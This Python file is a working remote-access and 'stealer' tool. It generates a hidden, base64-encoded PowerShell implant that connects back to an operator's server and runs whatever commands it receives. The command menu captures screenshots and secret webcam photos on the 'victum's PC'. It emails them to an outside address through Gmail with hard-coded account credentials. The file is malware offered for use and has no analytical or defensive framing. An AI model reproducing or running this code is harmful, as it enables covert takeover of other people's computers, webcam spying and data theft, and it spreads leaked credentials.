# Other imports
import base64
from threading import Thread
import socket
import sys

commandToSend = 'None'
WebCamCompile = False

def Base64Command(command):
    commandInBytes = command.encode('UTF-8')

    commandAddBytes = []
    for byte in commandInBytes:
        commandAddBytes.append(int(byte))
        commandAddBytes.append(int(0))

    commandAddBytes = bytes(commandAddBytes)

    return base64.b64encode(commandAddBytes).decode('UTF-8')

class CreateListener():
    def __init__(self, server, port=1330, sleep=2):
        self.server = server
        self.port = port
        self.sleep = sleep

    def Compile(self):
        commandInBytes = self.command.encode('UTF-8')

        commandAddBytes = []
        for byte in commandInBytes:
            commandAddBytes.append(int(byte))
            commandAddBytes.append(int(0))

        commandAddBytes = bytes(commandAddBytes)

        print(f"powershell -w 1 -enc {base64.b64encode(commandAddBytes).decode('UTF-8')}")

    def Create(self):
        figOpen = '{'
        figClose = '}'

        server = f"'{self.server}'"

        self.command = f"$server = {server};$port = {self.port};$message = 'Get-Command';$ip = [System.Net.Dns]::GetHostAddresses($server) | Where-Object {figOpen}$PSItem.AddressFamily -eq 'InterNetwork'{figClose};$socket = New-Object System.Net.Sockets.TCPClient($ip, $port);while ($true) {figOpen}try {figOpen}$stream = $socket.GetStream();$writer = New-Object System.IO.StreamWriter($stream);foreach ($line in $message){figOpen}$writer.WriteLine($line);$writer.Flush();{figClose}$reader = New-Object System.IO.StreamReader($stream);$string = '';while ($reader.Peek() -ge 0){figOpen}$result = $reader.Read();$string += [char]$result;{figClose}if ('None' -ne $string) {figOpen}powershell.exe -enc $string;{figClose}Start-Sleep -Seconds {self.sleep};{figClose}catch{figOpen}$server = {server};$port = {self.port};$message = 'Get-Command';$ip = [System.Net.Dns]::GetHostAddresses($server) | Where-Object {figOpen}$PSItem.AddressFamily -eq 'InterNetwork'{figClose};$socket = New-Object System.Net.Sockets.TCPClient($ip, $port);Start-Sleep -Seconds 5;{figClose}{figClose};"

        print('[+] Listener Created')

    def Check(self):
        return True

def StartServer():
    global commandToSend
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_address = ('localhost', 1330)
    sock.bind(server_address)
    sock.listen(1)
    while True:
        try:
            connection, client_address = sock.accept()
            try:
                while True:
                    data = connection.recv(16)
                    if data:
                        connection.sendall(bytes(commandToSend, 'UTF-8'))
                        commandToSend='None'
                    else:
                        break
            finally:
                connection.close()
        except Exception as e:
            print(f'ERR: {e}')

class Server():
    def Start(self):
        Thread(target = StartServer).start()
        print('[+] Server started at localhost with 1330 port')

    def Check(self):
        return True

class Commands():
    class get():
        def SendDataOnMail(self, data):
            return f'$EmailFrom = "homerorkamixadyt@gmail.com";$EmailTo = "amalron@mail.ru";$SMTPServer = "smtp.gmail.com";$SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587);$SMTPClient.EnableSsl = $true;$SMTPClient.Credentials = New-Object System.Net.NetworkCredential "homerorkamixadyt@gmail.com", "qgnbppmokyzrxpxr";$SMTPClient.Send($EmailFrom, $EmailTo, "Stealer Shell", "{data}");'

        def MakeScreenshot(self):
            return '$Path = "C:\ps\screenshots";If (!(test-path $path)) {New-Item -ItemType Directory -Force -Path $path};Add-Type -AssemblyName System.Windows.Forms;$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds;$image = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height);$graphic = [System.Drawing.Graphics]::FromImage($image);$point = New-Object System.Drawing.Point(0, 0);$graphic.CopyFromScreen($point, $point, $image.Size);$cursorBounds = New-Object System.Drawing.Rectangle([System.Windows.Forms.Cursor]::Position, [System.Windows.Forms.Cursor]::Current.Size);[System.Windows.Forms.Cursors]::Default.Draw($graphic, $cursorBounds);$screen_file = "C:\ps\screenshots\Screen.png";$image.Save($screen_file, [System.Drawing.Imaging.ImageFormat]::Png);'

        def SendScreenshotOnMail(self):
            return '$EmailFrom = "homerorkamixadyt@gmail.com";$EmailTo = "amalron@mail.ru";$SMTPServer = "smtp.gmail.com";$src = "cid:image1.png";$body = "<img src= $src/>";$SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587);$SMTPClient.EnableSsl = $true;$SMTPClient.Credentials = New-Object System.Net.NetworkCredential "$EmailFrom", "qgnbppmokyzrxpxr";$attachment = New-Object System.Net.Mail.Attachment("C:\ps\screenshots\Screen.png");$attachment.ContentDisposition.Inline = $True;$attachment.ContentDisposition.DispositionType = "Inline";$attachment.ContentType.MediaType = "image/png";$attachment.ContentId = "image1.png";$message = New-Object System.Net.Mail.MailMessage;$message.subject = "Stealer Shell";$message.IsBodyHtml = $True;$message.body = $body;$message.to.add($EmailTo);$message.from = $EmailFrom;$message.attachments.add($attachment);$SMTPClient.Send($message);$attachment.Dispose();$message.Dispose();'

        def ShowPopup(self, text, title, timeout=0, flags=None):
            if flags == None:
                return f'$wshell = New-Object -ComObject Wscript.Shell;$Output = $wshell.Popup("{text}",{timeout},"{title}");'
            elif len(flags) == 1:
                flags = flags.split(',')
                return f'$wshell = New-Object -ComObject Wscript.Shell;$Output = $wshell.Popup("{text}",{timeout},"{title}",{flags[0]});'
            else:
                flags = flags.split(',')
                flagsStr = ""

                for flag in flags:
                    flagsStr += f"{flag}+"
                flagsStr = flagsStr[:-1]

                return f'$wshell = New-Object -ComObject Wscript.Shell;$Output = $wshell.Popup("{text}",{timeout},"{title}",{flagsStr});'

        def PlayStarWarsMelody(self):
            return '[console]::beep(440,500);[console]::beep(440,500);[console]::beep(440,500);[console]::beep(349,350);[console]::beep(523,150);[console]::beep(440,500);[console]::beep(349,350);[console]::beep(523,150);[console]::beep(440,1000);[console]::beep(659,500);[console]::beep(659,500);[console]::beep(659,500);[console]::beep(698,350);[console]::beep(523,150);[console]::beep(415,500);[console]::beep(349,350);[console]::beep(523,150);[console]::beep(440,1000);[console]::beep(880,500);[console]::beep(440,350);[console]::beep(440,150);[console]::beep(880,500);[console]::beep(830,250);[console]::beep(784,250);[console]::beep(740,125);[console]::beep(698,125);[console]::beep(740,250);[console]::beep(455,250);[console]::beep(622,500);[console]::beep(587,250);[console]::beep(554,250);[console]::beep(523,125);[console]::beep(466,125);[console]::beep(523,250);[console]::beep(349,125);[console]::beep(415,500);[console]::beep(349,375);[console]::beep(440,125);[console]::beep(523,500);[console]::beep(440,375);[console]::beep(523,125);[console]::beep(659,1000);[console]::beep(880,500);[console]::beep(440,350);[console]::beep(440,150);[console]::beep(880,500);[console]::beep(830,250);[console]::beep(784,250);[console]::beep(740,125);[console]::beep(698,125);[console]::beep(740,250);[console]::beep(455,250);[console]::beep(622,500);[console]::beep(587,250);[console]::beep(554,250);[console]::beep(523,125);[console]::beep(466,125);[console]::beep(523,250);[console]::beep(349,250);[console]::beep(415,500);[console]::beep(349,375);[console]::beep(523,125);[console]::beep(440,500);[console]::beep(349,375);[console]::beep(261,125);[console]::beep(440,1000);'

        def MakeWebCamCompile(self):
            source = '''
            $source = 'using System;using System.Runtime.InteropServices;namespace WebCamera{public class Program{[DllImport("avicap32.dll", EntryPoint = "capCreateCaptureWindowA")]private static extern IntPtr capCreateCaptureWindow(string lpszWindowName, int dwStyle, int x, int y, int nWidth, int nHeight, IntPtr hWndParent, int nID);[DllImport("user32.dll", EntryPoint = "SendMessage")]private static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);private const int WM_CAP_START = 0x400;private const int WM_CAP_DRIVER_CONNECT = 0x40a;private const int WM_CAP_DRIVER_DISCONNECT = 0x40b;private const int WM_CAP_SAVEDIB = 0x419;private const int WM_CAP_SET_PREVIEW = 0x432;private const int WM_CAP_SET_PREVIEWRATE = 0x434;private const int WM_CAP_SET_SCALE = 0x435;public static void Main(string[] args){IntPtr hWnd = capCreateCaptureWindow("Webcam", 0, 0, 0, 320, 240, IntPtr.Zero, 0);SendMessage(hWnd, WM_CAP_DRIVER_CONNECT, IntPtr.Zero, IntPtr.Zero);SendMessage(hWnd, WM_CAP_SET_PREVIEWRATE, new IntPtr(30), IntPtr.Zero);SendMessage(hWnd, WM_CAP_SET_PREVIEW, IntPtr.Zero, IntPtr.Zero);IntPtr hBmp = Marshal.StringToHGlobalAnsi(@"C:\ps\screenshots\photo.jpg");SendMessage(hWnd,WM_CAP_SAVEDIB,IntPtr.Zero,hBmp);SendMessage(hWnd, WM_CAP_DRIVER_DISCONNECT, IntPtr.Zero, IntPtr.Zero);}}}';
            '''
            source = source.split('\n')[1]
            return source

        def MakeWebCamScreenshot(self):
            return 'Add-Type -TypeDefinition $source;$image = [WebCamera.Program]::Main(0);'

        def SendWebCamScreenshotOnMail(self):
            return '$EmailFrom = "homerorkamixadyt@gmail.com";$EmailTo = "amalron@mail.ru";$SMTPServer = "smtp.gmail.com";$src = "cid:image1.png";$body = "<img src= $src/>";$SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587);$SMTPClient.EnableSsl = $true;$SMTPClient.Credentials = New-Object System.Net.NetworkCredential "$EmailFrom", "qgnbppmokyzrxpxr";$attachment = New-Object System.Net.Mail.Attachment("C:\ps\screenshots\photo.jpg");$attachment.ContentDisposition.Inline = $True;$attachment.ContentDisposition.DispositionType = "Inline";$attachment.ContentType.MediaType = "image/png";$attachment.ContentId = "image1.png";$message = New-Object System.Net.Mail.MailMessage;$message.subject = "Stealer Shell";$message.IsBodyHtml = $True;$message.body = $body;$message.to.add($EmailTo);$message.from = $EmailFrom;$message.attachments.add($attachment);$SMTPClient.Send($message);$attachment.Dispose();$message.Dispose();'

while True:
    command = input('ShellStealler > ')
    if command.split(' ')[0].lower() == 'server':
        if len(command.split(' ')) == 1:
            print("Options of 'server' command:\n    create - Create server\n    start - Start server")
        else:
            try:
                ServerS.Check()
            except Exception as e:
                pass
            if command.split(' ')[1].lower() == 'start':
                try:
                    ServerS.Start()
                except Exception as e:
                    print('[!] No server found! Create server by "server create" command')
            elif command.split(' ')[1].lower() == 'create':
                ServerS = Server()
                print('[+] Server created')
            else:
                print(f'[!] No parametr {command.split(" ")[1]}')
    elif command.split(' ')[0].lower() == 'listener':
        if len(command.split(' ')) == 1:
            print("Options of 'listener' command:\n    create [server name] - Create listener\n    compile - Sends you code for injection")
        else:
            try:
                ListenerS.Check()
            except Exception as e:
                pass
            if command.split(' ')[1].lower() == 'compile':
                try:
                    ListenerS.Compile()
                except Exception as e:
                    print('[!] No listener found! Create listener by "listener create [server name]" command')
            elif command.split(' ')[1].lower() == 'create':
                try:
                    ListenerS = CreateListener(server = command.split(' ')[2])
                    ListenerS.Create()
                except Exception as e:
                    print('[!] Error! Create listener by "listener create [server name]" command')
            else:
                print(f'[!] No parametr {command.split(" ")[1]}')
    elif command.split(' ')[0].lower() == 'execute':
        if len(command.split(' ')) == 1:
            print("Options of 'execute' command:\n    MakeScreenshot - Makes screenshot on victum's PC\n    SendScreenshotOnMail - Sends made screenshot on your mail\n    ShowPopup [title] [text] [timeout]* [flags]* - Shows popup on victum's PC\n    PlayStarWarsMelody - Plays star wars melody\n    MakeWebCamCompile - Compiles victum's camera for executing\n    MakeWebCamScreenshot - Makes photo from camera\n    SendWebCamScreenshotOnMail - Sends webcam photo on mail")
        else:
            if command.split(' ')[1].lower() == 'makescreenshot':
                commandToSend = Base64Command(Commands().get().MakeScreenshot())
            elif command.split(' ')[1].lower() == 'sendscreenshotonmail':
                commandToSend = Base64Command(Commands().get().SendScreenshotOnMail())
            elif command.split(' ')[1].lower() == 'showpopup':
                if len(command.split(' ')) < 4:
                    print('[!] No parameters! Use "execute ShowPopup [title] [text] [timeout]* [flags]*"')
                else:
                    if len(command.split(' ')) == 4:
                        commandToSend = Base64Command(Commands().get().ShowPopup(title = command.split(' ')[2], text = command.split(' ')[3]))
                    elif len(command.split(' ')) == 5:
                        commandToSend = Base64Command(Commands().get().ShowPopup(title = command.split(' ')[2], text = command.split(' ')[3], timeout = command.split(' ')[4]))
                    elif len(command.split(' ')) == 6:
                        commandToSend = Base64Command(Commands().get().ShowPopup(title = command.split(' ')[2], text = command.split(' ')[3], timeout = command.split(' ')[4], flags = command.split(' ')[5]))
                    else:
                        print('[!] Too much parameters')
            elif command.split(' ')[1].lower() == 'playstarwarsmelody':
                commandToSend = Base64Command(Commands().get().PlayStarWarsMelody())
            elif command.split(' ')[1].lower() == 'makewebcamcompile':
                if not WebCamCompile:
                    commandToSend = Base64Command(Commands().get().MakeWebCamCompile())
                    WebCamCompile = True
                    print('[+] WebCam driver compiled')
                else:
                    print('[!] You have already compiled WebCam')
            elif command.split(' ')[1].lower() == 'makewebcamscreenshot':
                if not WebCamCompile:
                    print('[!] You need to compile WebCam first. Use "execute MakeWebCamCompile"')
                else:
                    commandToSend = Base64Command(Commands().get().MakeWebCamScreenshot())
            elif command.split(' ')[1].lower() == 'sendwebcamscreenshotonmail':
                commandToSend = Base64Command(Commands().get().SendWebCamScreenshotOnMail())
            else:
                print(f'[!] No execute command {command.split(" ")[1]}')
    else:
        print(f'[!] No command {command}')
